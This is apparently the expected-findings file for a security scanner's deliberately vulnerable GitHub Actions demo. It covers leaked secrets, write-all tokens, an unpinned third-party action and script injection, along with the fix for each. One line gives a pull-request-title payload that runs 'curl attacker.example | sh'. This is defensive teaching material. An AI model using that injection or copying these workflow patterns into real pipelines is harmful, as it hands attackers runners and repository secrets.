# Expected Plumber findings

Run from the repo root (GitHub auth via `gh` recommended so the run completes
and shows a letter score):

```bash
plumber analyze --score-point
```

Verified with Plumber CLI 0.6.0: **38 / 100 (D)**, three attack paths and three
individual findings. Nine issue codes fire, all on `.github/workflows/ci.yml`.
Nothing else fails: the `test` and `coverage` checkouts set
`persist-credentials: false`, and those jobs declare `permissions`, so the
report stays focused on the patterns the demo is about.

## Attack paths (scored as paths, not as individual findings)

| Path | Severity | Entry | What it reaches | Codes on the path |
| --- | --- | --- | --- | --- |
| 1 | High | `getplumber-examples/totally-fine-action@v1` (untrusted, mutable) | Every secret, a write-all token, an OIDC token | `ISSUE-701`, `ISSUE-713`, `ISSUE-309`, `ISSUE-803`, `ISSUE-203` |
| 2 | High | `github.head_ref` injected in a script | Code execution on the runner | `ISSUE-209` |
| 3 | High | `github.event.pull_request.title` injected in a script | Code execution on the runner | `ISSUE-207` |

Path 1 is capped at High because `.plumber.yaml` says an action is not trusted
just for living in our GitHub org (`ISSUE-713`). Paths 2 and 3 are High rather
than Critical because a `pull_request` run from a fork only carries a read-only
token: the attacker gets the runner, not the secrets.

## Individual findings

| Code | Severity | Control | Where | The fix |
| --- | --- | --- | --- | --- |
| `ISSUE-302` | High | Reusable workflows must not inherit secrets | `deploy` job calls `deploy.yml` with `secrets: inherit` | Forward named secrets explicitly |
| `ISSUE-801` | Medium | Workflows must declare permissions | `image` job has no `permissions:` block | Declare `permissions: { contents: read }` |
| `ISSUE-307` | Low | Checkout must not persist credentials | `image` job checks out without `persist-credentials: false` | Set `persist-credentials: false` |

## Every code, and its fix

| Code | Severity | Where | The fix |
| --- | --- | --- | --- |
| `ISSUE-203` | Critical | `coverage` job sets `ACTIONS_STEP_DEBUG: true` | Remove the debug variable |
| `ISSUE-207` | Critical | `coverage` job echoes `${{ github.event.pull_request.title }}` in a `run:` script | Pass the value through an `env:` variable and quote it |
| `ISSUE-309` | Critical | `coverage` job sets `ALL_SECRETS: ${{ toJSON(secrets) }}` | Pass only the secrets a step needs, by name |
| `ISSUE-209` | High | `coverage` job writes `${{ github.head_ref }}` into `$GITHUB_ENV` | Pass the value through an `env:` variable |
| `ISSUE-302` | High | `deploy` job calls `deploy.yml` with `secrets: inherit` | Forward named secrets explicitly |
| `ISSUE-701` | High | `coverage` job uses `totally-fine-action@v1` | Pin to a commit SHA (and vet the action) |
| `ISSUE-713` | High | `totally-fine-action` is not an authorized source | Policy decision: allowlist the owner in `.plumber.yaml` or vendor the action |
| `ISSUE-803` | High | `coverage` job sets `permissions: write-all` | Grant only the scopes the job needs |
| `ISSUE-801` | Medium | `image` job declares no `permissions:` | Declare the minimal block |
| `ISSUE-307` | Low | `image` job checkout keeps credentials | `persist-credentials: false` |

## What the Plumber agent fixes

Every code above except `ISSUE-713` has a repair path in the Plumber agent:

- Deterministic resolvers, no model call: `ISSUE-701` (pin to SHA), `ISSUE-309`
  (named secrets), `ISSUE-302` (explicit secret mapping), `ISSUE-803` and
  `ISSUE-801` (minimal `permissions:` block).
- Model-proposed, oracle-verified: `ISSUE-207` and `ISSUE-209` (bind the
  untrusted value through `env:`), `ISSUE-307` (add `persist-credentials: false`),
  `ISSUE-203` (delete the debug variable).
- `ISSUE-713` is a policy decision, not an auto-fix.

## How the attack chains together

`ISSUE-309` hands every repository secret to the `coverage` job's environment.
`ISSUE-803` gives that job write access to the whole repository. `ISSUE-701`
lets a third-party action run there, trusted by a mutable tag that an attacker
can repoint. `ISSUE-203` makes sure the leaked material also lands in the logs.
`ISSUE-302` then forwards the same secrets into a second workflow. Each finding
is a rung; together they are the ladder.

`ISSUE-207` and `ISSUE-209` open a second door that needs no compromised
dependency at all: a pull request titled `"; curl attacker.example | sh #`
runs on the same job.

The `coverage` step runs
[`getplumber-examples/totally-fine-action`](https://github.com/getplumber-examples/totally-fine-action),
which is built to behave like a supply-chain-compromised action.
